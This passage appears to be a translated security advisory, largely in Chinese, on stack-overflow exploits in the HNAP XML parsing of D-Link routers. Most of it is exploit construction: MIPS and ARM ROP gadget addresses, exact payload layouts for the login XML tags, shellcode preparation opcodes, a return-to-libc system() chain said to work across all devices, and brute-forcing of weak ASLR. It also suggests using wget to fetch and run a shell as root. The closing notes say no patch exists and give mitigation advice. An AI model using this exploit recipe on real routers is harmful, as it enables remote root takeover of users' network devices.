    .text:0004EA30                 move    $a2, $zero
    .text:0004EA34                 jr      $t9 
    .text:0004EA38                 addiu   $sp, 0x20
    second_gadget - puts stack pointer in a1:
    .text:0002468C                 addiu   $s1, $sp, 0x58
    .text:00024690                 li      $s0, 0x44
    .text:00024694                 move    $a2, $s0
    .text:00024698                 move    $a1, $s1
    .text:0002469C                 move    $t9, $s4
    .text:000246A0                 jalr    $t9
    .text:000246A4                 move    $a0, $s2
    third_gadget - call $a1 (which now has the stack pointer):
    .text:00041F3C                 move    $t9, $a1
    .text:00041F40                 move    $a1, $a2
    .text:00041F44                 addiu   $a0, 8
    .text:00041F48                 jr      $t9
    .text:00041F4C                 nop
当崩溃发生时，栈指针指向xml_tag_value[3128]。为了给shellcode留出更大的空间（3000+字节），可以跳到xml_tag_value[0]中。
    prep_shellcode_1 =  23bdf3c8 # addisp,sp,-3128
    prep_shellcode_2 =  03a0f809 # jalrsp
    branch_delay =  2084f830   # addia0,a0,-2000 (NOP executed as a MIPS branch delay slot)
最终的Action/Username/LoginPassword/Catpcha 的XML标签值将是：
    shellcode +'a'*（3072 - shellcode.size）+ sleep（）+'1'* 4 +'2'* 4 +'3'* 4 + third_gadget + first_gadget +'b'* 0x1c + second_gadget +'c '* 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay
'a'，'b'和'c'只是用于填充缓冲区的，而'1111'，'2222'和'3333'将是寄存器s1、s2、s3的值（这些寄存器对于exp是无用的），其余的是ROP链，shellcode和栈初始化程序。在payload中唯一不能发送的坏字节是空字节，因为这是一个str（n）cpy函数造成的溢出。最多可以发送3350个字符，因为超出之后很难去控制溢出的可靠性。注意，所有的这些利用的都是strncpy造成的第一个缓冲区溢出，但是第二个缓冲区溢出可以通过类似的方式进行利用。
如前面所述，由于使用了不完整的MIPS内核，因此在网上找到的通用shellcode可能会失败。可以通过做一些微小的工作来解决它，但是最好的方法是去制作一个可靠的shellcode。如果没有使用编码器的话，Metasploit生成的简单的bind
shell似乎就可以稳定的工作。
    -----------------------    ARM exploitation
    -----------------------    The same two stack overflows affect ARM, but require less bytes to overflow the stack. The following snippet is the same part of parse_xml_value as shown for MIPS (taken from firmware 2.03b01 for the DIR-868 Rev. B):
    .text:00018F34 C30 LDR             R1, [R11,#src] ; src
    .text:00018F38 C30 LDR             R2, [R11,#n] ; n
    .text:00018F3C C30 SUB             R3, R11, #-xml_tag_var
    .text:00018F40 C30 SUB             R3, R3, #4
    .text:00018F44 C30 SUB             R3, R3, #4
    .text:00018F48 C30 MOV             R0, R3  ; dest
    .text:00018F4C C30 BL              strncpy ; first overflow occurs here (xml_tag_var in parse_xml_stack) with 1024+ characters
    .text:00018F50 C30 MOV             R3, #0xFFFFFBEC
    .text:00018F58 C30 LDR             R2, [R11,#n]
    .text:00018F5C C30 SUB             R1, R11, #-var_4
    .text:00018F60 C30 ADD             R2, R1, R2
    .text:00018F64 C30 ADD             R3, R2, R3
    .text:00018F68 C30 MOV             R2, #0
    .text:00018F6C C30 STRB            R2, [R3] 
    .text:00018F70 C30 SUB             R3, R11, #-xml_tag_var
    .text:00018F74 C30 SUB             R3, R3, #4
    .text:00018F78 C30 SUB             R3, R3, #4
    .text:00018F7C C30 LDR             R0, [R11,#a2_ptr] ; a2_ptr is is a stack variable from hnap_main
    .text:00018F80 C30 MOV             R1, R3  ; src
    .text:00018F84 C30 BL              strcpy  ; second overflow occurs here
与MIPS的二进制文件相比，parse_xml_value和hnap_main的栈大小会变得更小。这一次，parse_xml_value中的strncpy溢出更容易被利用，只需要1024字节就足以溢出堆栈。与MIPS漏洞利用相同的是，唯一的坏字节是空字节。
受影响的ARM设备具有不可执行堆栈（NX）和32位ASLR的保护。 NX可以用ROP来关闭，而32位的ASLR很弱 –
地址中通常只有3个字节会发生变化，这意味着只有4096种可能。攻击需要执行多次，直到命中了正确的基地址，但这通常可以在少于1000次尝试中实现。
最容易进行的攻击是通过return-to-libc来调用system()函数执行命令。为此，R0在调用system()函数之前必须要指向命令所在的栈内存地址。所有受影响的ARM设备无论是何种固件版本的都使用相同的uClibc（libuClibc-0.9.32.1.so），这使得寻找gadgets更加容易，并允许构建一个可以在所有设备上使用的漏洞exp，并而无需进行任何修改。
    first_gadget (pops system() address into r3, and second_gadget into PC):
    .text:00018298                 LDMFD           SP!, {R3,PC}
    second_gadget (puts the stack pointer into r0 and calls system() at r3): 
    .text:00040CB8                 MOV             R0, SP
    .text:00040CBC                 BLX             R3
    system() (Executes argument in r0 (our stack pointer)
    .text:0005A270 system
    The final Action / Username / LoginPassword / Catpcha XML parameter value will be:
    'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() + second_gadget + command
    a / b = filler
    0xffffffff = integer n (see below)
    AAAA = R11
    first_gadget = initial PC
    payload = stack points here after execution of our ROP chain; it should point to whatever we want system() to execute
当溢出发生时，栈上局部变量“n”被覆盖，这个局部变量是用于计算内存地址的（见0x18F58）。为了避免在shellcode执行之前该进程就发生崩溃，这个变量需要被设置为一个有效内存地址。一个比较好的候选值是0xffffffff，因为这将从计算的内存地址中减去1，以防止无效的内存访问。
从这一点出发，可以在payload中执行任何命令。例如，wget可以用于下载shell并执行，或者可以启动telnet服务器。所有命令将以root权限来执行。
**  
**
**修复建议**
Dlink并没有响应CERT的请求，因此在撰写本文时并没有可用的固件补丁。
鉴于此漏洞只能在LAN中进行利用，所以建议使用高强度的wifi密码，以防止不受信任的客户端连接到路由器。
**参考链接**
[1]
[2] 
[3] 
[4] 
[5] 
[6] 
[7] 
[8] 
[9] 
[10] 